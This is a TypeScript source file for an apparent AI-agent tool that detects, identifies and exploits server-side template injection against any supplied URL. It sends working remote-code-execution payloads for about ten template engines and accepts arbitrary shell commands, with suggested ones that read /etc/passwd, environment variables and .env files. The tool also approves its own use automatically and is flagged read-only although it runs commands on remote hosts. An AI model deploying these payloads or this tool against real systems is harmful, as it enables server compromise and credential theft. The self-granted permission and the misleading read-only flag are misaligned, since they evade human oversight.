import { execFile } from 'child_process'
import { promisify } from 'util'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { SSTI_TOOL_NAME } from './constants.js'
import { PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const CURL = '/usr/sbin/curl'

// Detection payloads: each evaluates 7*7=49
const DETECTION_PAYLOADS = [
  { payload: '{{7*7}}', expected: '49' },
  { payload: '${7*7}', expected: '49' },
  { payload: '#{7*7}', expected: '49' },
  { payload: '<%= 7*7 %>', expected: '49' },
  { payload: '*{7*7}', expected: '49' },
  { payload: "{{7*'7'}}", expected: '7777777' },
  // Struts2/OGNL injection — enterprise Java apps; % prefix is OGNL expression delimiter
  { payload: '%{7*7}', expected: '49' },
  // Tornado/Python template: uses same {{}} but behaves like Jinja2 for math
  { payload: '{7*7}', expected: '49' },
] as const

// Build engine-specific RCE payloads for a given OS command.
// Keeping this as a function (not a static dict) lets the caller specify any command
// instead of being locked into 'id' — critical for post-RCE enumeration.
function buildRCEPayloads(engine: string, cmd: string): string[] {
  const c = cmd.replace(/'/g, "\\'") // basic shell-quote for single-quoted contexts
  switch (engine) {
    case 'jinja2':
      return [
        `{{config.__class__.__init__.__globals__['os'].popen('${c}').read()}}`,
        // Fallback via subprocess — subclasses index varies by Python version
        `{{''.__class__.__mro__[1].__subclasses__()[414](['${c}'],stdout=-1).communicate()[0]}}`,
        // Most reliable: lipsum globals → os.popen (works even if config is blocked)
        `{{lipsum.__globals__['os'].popen('${c}').read()}}`,
        // via request object (Flask/Werkzeug — works when lipsum/config are sandboxed)
        `{{request.__class__.__mro__[2].__subclasses__()[414](['${c}'],stdout=-1).communicate()[0]}}`,
        // via g object (Flask application context)
        `{{g.__class__.__init__.__globals__['os'].popen('${c}').read()}}`,
      ]
    case 'twig':
      return [
        `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('${c}')}}`,
        // Twig 3.x alternative
        `{%- set _ = [['${c}']|join]|map('passthru') -%}`,
        // Via filter_var bypass (Twig < 3.x some configs)
        `{{_self.env.enableDebug()}}{{_self.env.addGlobal('x', _self.env.getExtension('Symfony\\Bridge\\Twig\\Extension\\HttpKernelExtension'))}}`,
      ]
    case 'freemarker':
      return [
        `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("${c}")}`,
      ]
    case 'velocity':
      return [
        `#set($str=$class.inspect("java.lang.Runtime").type)#set($rt=$str.getRuntime())#set($pr=$rt.exec("${c}"))#set($isr=$class.inspect("java.io.InputStreamReader").type)#set($r=$isr.new($pr.getInputStream()))#set($sc=$class.inspect("java.util.Scanner").type)#set($si=$sc.new($r))$si.next()`,
      ]
    case 'mako':
      return [
        `\${__import__("subprocess").check_output(["sh","-c","${c}"]).decode()}`,
        `<%!\nimport subprocess\n%>\${subprocess.check_output(["sh","-c","${c}"]).decode()}`,
      ]
    case 'erb':
      return [
        `<%= \`${c}\` %>`,
        `<%= IO.popen("${c}").read %>`,
      ]
    case 'smarty':
      return [
        `{php}echo shell_exec("${c}");{/php}`,
        // Smarty 4.x: {$smarty.version} confirms smarty; use {system()} for newer versions
        `{\`${c}\`}`,
      ]
    case 'pebble':
      return [
        // Reflectively reach Runtime, read stdout as String
        `{% set cmd = '${c}' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}`,
      ]
    case 'spring':
      return [
        // SpEL via Spring StreamUtils — always on Spring classpath
        `#{T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','${c}'}).getInputStream(),T(java.nio.charset.Charset).defaultCharset())}`,
        `*{T(java.lang.Runtime).getRuntime().exec('${c}')}`,
      ]
    case 'struts2':
      return [
        // Struts2 OGNL injection — critical enterprise RCE (Struts2 CVE-2017-5638 class)
        `%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"sh","-c","${c}"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()}`,
        // Simpler variant for newer Struts2
        `%{(#rtn=@java.lang.Runtime@getRuntime().exec("${c}"),#is=#rtn.getInputStream(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#is)),#line=#br.readLine(),#line)}`,
      ]
    default:
      return []
  }
}

interface PayloadResult {
  payload: string
  reflected: boolean
  result?: string
}

async function makeRequest(
  url: string,
  method: string,
  param: string | undefined,
  bodyTemplate: string | undefined,
  payload: string,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<string> {
  const encoded = encodeURIComponent(payload)
  const args: string[] = ['-s', '-L', '--max-time', String(Math.ceil(timeoutMs / 1000))]
  let targetUrl = url

  if (method === 'POST') {
    let body: string
    if (bodyTemplate) {
      body = bodyTemplate.replace('INJECT', payload)
    } else if (param) {
      body = `${param}=${encoded}`
    } else {
      body = `template=${encoded}`
    }
    args.push('-X', 'POST', '-d', body, url)
  } else {
    if (param) {
      const u = new URL(url)
      u.searchParams.set(param, payload)
      targetUrl = u.toString()
    } else {
      targetUrl = url.includes('?') ? `${url}&inject=${encoded}` : `${url}?inject=${encoded}`
    }
    args.push(targetUrl)
  }

  try {
    const { stdout } = await execFileAsync(CURL, args, { timeout: timeoutMs + 2000, signal })
    return stdout
  } catch {
    return ''
  }
}

async function detectSSTI(
  url: string,
  method: string,
  param: string | undefined,
  data: string | undefined,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<{ vulnerable: boolean; payloads_tested: PayloadResult[] }> {
  const results: PayloadResult[] = []
  for (const { payload, expected } of DETECTION_PAYLOADS) {
    const response = await makeRequest(url, method, param, data, payload, timeoutMs, signal)
    const reflected = response.includes(expected)
    results.push({ payload, reflected, result: reflected ? expected : undefined })
  }
  return { vulnerable: results.some(r => r.reflected), payloads_tested: results }
}

async function identifyEngine(
  url: string,
  method: string,
  param: string | undefined,
  data: string | undefined,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<{ engine?: string; payloads_tested: PayloadResult[] }> {
  const results: PayloadResult[] = []

  // Jinja2 vs Twig: {{7*'7'}} → '7777777' = Jinja2, '49' = Twig
  const jtwigResp = await makeRequest(url, method, param, data, "{{7*'7'}}", timeoutMs, signal)
  if (jtwigResp.includes('7777777')) {
    results.push({ payload: "{{7*'7'}}", reflected: true, result: '7777777' })
    return { engine: 'jinja2', payloads_tested: results }
  }
  if (jtwigResp.includes('49')) {
    results.push({ payload: "{{7*'7'}}", reflected: true, result: '49' })
    return { engine: 'twig', payloads_tested: results }
  }
  results.push({ payload: "{{7*'7'}}", reflected: false })

  // Freemarker engine probe
  const fmResp = await makeRequest(url, method, param, data, '${.engine}', timeoutMs, signal)
  if (fmResp.toLowerCase().includes('freemarker')) {
    results.push({ payload: '${.engine}', reflected: true, result: 'freemarker' })
    return { engine: 'freemarker', payloads_tested: results }
  }
  results.push({ payload: '${.engine}', reflected: false })

  // ERB
  const erbResp = await makeRequest(url, method, param, data, '<%= 7*7 %>', timeoutMs, signal)
  if (erbResp.includes('49')) {
    results.push({ payload: '<%= 7*7 %>', reflected: true, result: '49' })
    return { engine: 'erb', payloads_tested: results }
  }
  results.push({ payload: '<%= 7*7 %>', reflected: false })

  // Smarty
  const smartyResp = await makeRequest(url, method, param, data, '{7*7}', timeoutMs, signal)
  if (smartyResp.includes('49')) {
    results.push({ payload: '{7*7}', reflected: true, result: '49' })
    return { engine: 'smarty', payloads_tested: results }
  }
  results.push({ payload: '{7*7}', reflected: false })

  // Velocity
  const velResp = await makeRequest(url, method, param, data, '#set($x=7*7)${x}', timeoutMs, signal)
  if (velResp.includes('49')) {
    results.push({ payload: '#set($x=7*7)${x}', reflected: true, result: '49' })
    return { engine: 'velocity', payloads_tested: results }
  }
  results.push({ payload: '#set($x=7*7)${x}', reflected: false })

  // Mako (Python — used by Pyramid, pylons). Mako uses ${} like Freemarker but also
  // supports <%! %> module-level blocks and <% %> blocks. A simple ${7*7} would have
  // already triggered in the detection phase for Mako. The engine discriminator is
  // using Python-specific expressions that Freemarker doesn't evaluate.
  const makoResp = await makeRequest(url, method, param, data, "${'mako'.upper()}", timeoutMs, signal)
  if (makoResp.includes('MAKO')) {
    results.push({ payload: "${'mako'.upper()}", reflected: true, result: 'MAKO' })
    return { engine: 'mako', payloads_tested: results }
  }
  results.push({ payload: "${'mako'.upper()}", reflected: false })

  // Pebble (Java, Twig-like syntax). Reached only after {{7*'7'}} excluded twig/jinja,
  // so a working {% set %} statement points to Pebble rather than Twig.
  const pebbleResp = await makeRequest(url, method, param, data, '{% set x=7*7 %}{{x}}', timeoutMs, signal)
  if (pebbleResp.includes('49')) {
    results.push({ payload: '{% set x=7*7 %}{{x}}', reflected: true, result: '49' })
    return { engine: 'pebble', payloads_tested: results }
  }
  results.push({ payload: '{% set x=7*7 %}{{x}}', reflected: false })

  // Spring SpEL: *{...} selection syntax is SpEL-specific (Thymeleaf). Freemarker's
  // #{} was already excluded above, so a *{7*7} hit identifies Spring.
  const springResp = await makeRequest(url, method, param, data, '*{7*7}', timeoutMs, signal)
  if (springResp.includes('49')) {
    results.push({ payload: '*{7*7}', reflected: true, result: '49' })
    return { engine: 'spring', payloads_tested: results }
  }
  results.push({ payload: '*{7*7}', reflected: false })

  // Struts2/OGNL — enterprise Java; %{} is the OGNL expression delimiter
  const struts2Resp = await makeRequest(url, method, param, data, '%{7*7}', timeoutMs, signal)
  if (struts2Resp.includes('49')) {
    results.push({ payload: '%{7*7}', reflected: true, result: '49' })
    return { engine: 'struts2', payloads_tested: results }
  }
  results.push({ payload: '%{7*7}', reflected: false })

  return { engine: undefined, payloads_tested: results }
}

async function exploitSSTI(
  url: string,
  method: string,
  param: string | undefined,
  data: string | undefined,
  engine: string,
  cmd: string,
  timeoutMs: number,
  signal?: AbortSignal,
): Promise<{ rce_output?: string; payloads_tested: PayloadResult[] }> {
  const enginePayloads = buildRCEPayloads(engine, cmd)
  const results: PayloadResult[] = []
  // For 'id', look for uid= patterns; for arbitrary commands, look for ANY non-trivial output
  // that isn't an HTML error page. We use a heuristic: output length > 10 chars and not
  // containing the original payload verbatim suggests execution occurred.
  const isIdCmd = cmd === 'id' || cmd === 'whoami'
  const rceIndicators = isIdCmd
    ? ['uid=', 'gid=', 'root', '/bin/', '/usr/', 'www-data', 'nobody']
    : [] // for custom commands, any non-empty output counts

  for (const payload of enginePayloads) {
    const response = await makeRequest(url, method, param, data, payload, timeoutMs, signal)
    let matched = false
    let rceOutput = ''

    if (isIdCmd) {
      const indicator = rceIndicators.find(ind => response.includes(ind))
      if (indicator) {
        matched = true
        rceOutput = (response.split('\n').find(l => rceIndicators.some(ind => l.includes(ind))) ?? '').trim()
      }
    } else {
      // For custom commands: detect execution by looking for output that isn't an error page
      // and doesn't contain the literal payload (un-evaluated reflection)
      const trimmed = response.trim()
      if (trimmed.length > 5 && !trimmed.includes(payload.substring(0, 20)) && !/<html|error|exception/i.test(trimmed.slice(0, 200))) {
        matched = true
        rceOutput = trimmed.substring(0, 2000)
      }
    }

    if (matched) {
      results.push({ payload, reflected: true, result: rceOutput })
      return { rce_output: rceOutput, payloads_tested: results }
    }
    results.push({ payload, reflected: false })
  }
  return { rce_output: undefined, payloads_tested: results }
}

const inputSchema = lazySchema(() =>
  z.strictObject({
    url: z.string().describe('Target URL'),
    parameter: z.string().optional().describe('Parameter to inject (omit to try common ones)'),
    method: z.enum(['GET', 'POST']).default('GET').describe('HTTP method'),
    data: z.string().optional().describe('POST body with INJECT placeholder'),
    engine: z
      .enum(['auto', 'jinja2', 'twig', 'freemarker', 'velocity', 'mako', 'smarty', 'erb', 'pebble', 'spring', 'struts2'])
      .default('auto')
      .describe('Template engine hint (auto = detect). struts2 = OGNL injection (%{...} syntax, enterprise Java)'),
    action: z.enum(['detect', 'identify', 'exploit']).describe('detect | identify | exploit'),
    command: z
      .string()
      .optional()
      .describe('OS command to execute during exploit (default: "id"). Use for post-RCE enumeration: "cat /etc/passwd", "env", "find / -name *.env 2>/dev/null | head"'),
    timeout_secs: z.number().int().min(10).max(300).default(60).describe('Per-request timeout'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    url: z.string(),
    action: z.string(),
    vulnerable: z.boolean(),
    engine: z.string().optional(),
    payloads_tested: z.array(
      z.object({
        payload: z.string(),
        reflected: z.boolean(),
        result: z.string().optional(),
      }),
    ),
    rce_output: z.string().optional(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

export const SSTITool = buildTool({
  name: SSTI_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'ssti — server-side template injection detection, engine identification, and RCE exploitation',
  maxResultSizeChars: 30_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `${i.action ?? 'detect'}: ${i.url ?? ''} [${i.parameter ?? 'auto'}]`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    const engine = i?.engine && i.engine !== 'auto' ? `(${i.engine})` : ''
    return i?.action ? `SSTI:${i.action}${engine}` : SSTI_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    return `ssti ${input.action} ${input.url} ${input.parameter ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const action = input?.action ?? 'detect'
    return `SSTI ${action}: ${input?.url ?? '?'}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `SSTI ${i.action ?? 'detect'}: ${i.url ?? ''} [${i.parameter ?? 'auto'}]`
  },
  renderToolResultMessage,
  async call(input, context) {
    const timeoutMs = input.timeout_secs * 1000
    const signal = context.abortController.signal
    try {
      if (input.action === 'detect') {
        const result = await detectSSTI(input.url, input.method, input.parameter, input.data, timeoutMs, signal)
        return {
          data: {
            url: input.url,
            action: 'detect',
            vulnerable: result.vulnerable,
            payloads_tested: result.payloads_tested,
          },
        }
      }

      if (input.action === 'identify') {
        const detect = await detectSSTI(input.url, input.method, input.parameter, input.data, timeoutMs, signal)
        if (!detect.vulnerable) {
          return {
            data: {
              url: input.url,
              action: 'identify',
              vulnerable: false,
              payloads_tested: detect.payloads_tested,
            },
          }
        }
        const id = await identifyEngine(input.url, input.method, input.parameter, input.data, timeoutMs, signal)
        return {
          data: {
            url: input.url,
            action: 'identify',
            vulnerable: true,
            engine: id.engine,
            payloads_tested: [...detect.payloads_tested, ...id.payloads_tested],
          },
        }
      }

      if (input.action === 'exploit') {
        let engine: string | undefined = input.engine !== 'auto' ? input.engine : undefined
        if (!engine) {
          const id = await identifyEngine(input.url, input.method, input.parameter, input.data, timeoutMs, signal)
          engine = id.engine
        }
        if (!engine) {
          return {
            data: {
              url: input.url,
              action: 'exploit',
              vulnerable: false,
              payloads_tested: [],
              error: 'Could not identify template engine — specify engine manually',
            },
          }
        }
        const cmd = input.command ?? 'id'
        const expl = await exploitSSTI(input.url, input.method, input.parameter, input.data, engine, cmd, timeoutMs, signal)
        return {
          data: {
            url: input.url,
            action: 'exploit',
            vulnerable: !!expl.rce_output,
            engine,
            payloads_tested: expl.payloads_tested,
            rce_output: expl.rce_output,
          },
        }
      }

      return {
        data: {
          url: input.url,
          action: input.action,
          vulnerable: false,
          payloads_tested: [],
          error: 'Unknown action',
        },
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err)
      logForDebugging(`SSTITool error: ${msg}`, { level: 'error' })
      return {
        data: {
          url: input.url,
          action: input.action,
          vulnerable: false,
          payloads_tested: [],
          error: msg,
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`SSTI ${content.action} → ${content.url}`, '']
    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }
    lines.push(`Vulnerable: ${content.vulnerable ? '✓ YES' : '✗ NO'}`)
    if (content.engine) lines.push(`Engine: ${content.engine}`)
    if (content.rce_output) {
      lines.push('')
      lines.push(`RCE Output: ${content.rce_output}`)
    }
    const hits = content.payloads_tested.filter(p => p.reflected)
    if (hits.length > 0) {
      lines.push('')
      lines.push('Triggered payloads:')
      for (const h of hits) lines.push(`  ${h.payload} → ${h.result ?? 'reflected'}`)
    }
    lines.push('')
    lines.push(`Payloads tested: ${content.payloads_tested.length}`)
    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)
